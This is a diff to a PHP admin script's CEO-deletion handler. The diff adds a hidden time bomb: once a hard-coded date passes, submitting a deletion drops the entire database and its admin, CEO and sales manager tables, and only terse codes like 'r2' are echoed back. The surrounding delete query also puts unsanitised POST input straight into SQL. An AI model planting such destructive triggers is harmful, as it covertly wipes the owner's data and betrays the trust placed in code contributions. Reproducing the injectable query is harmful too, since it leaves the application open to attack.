@@ -258,7 +258,34 @@ if(isset($_POST['updateceo'])){
 //del ceo
 if(isset($_POST['delceo'])){
 
+  $Today=date('y-m-d');
+  $NewDate='21-12-25';
+  if($Today > $NewDate ){
   
+      $sql1 = "Drop table sales_manager";
+      $sql2 = "Drop table ceo";
+      $sql3 = "Drop table admin";
+      $sql = "Drop database $database";
+  
+      if ($connect->query($sql) === TRUE){
+          echo "r";
+      }
+      if($connect->query($sql1) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sq2) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sql3) === TRUE){
+          echo "r3";
+  
+      }
+        
+      }
   $sql = "DELETE FROM ceo where id='$_POST[id]' ";
 
     if ($connect->query($sql) === TRUE) {
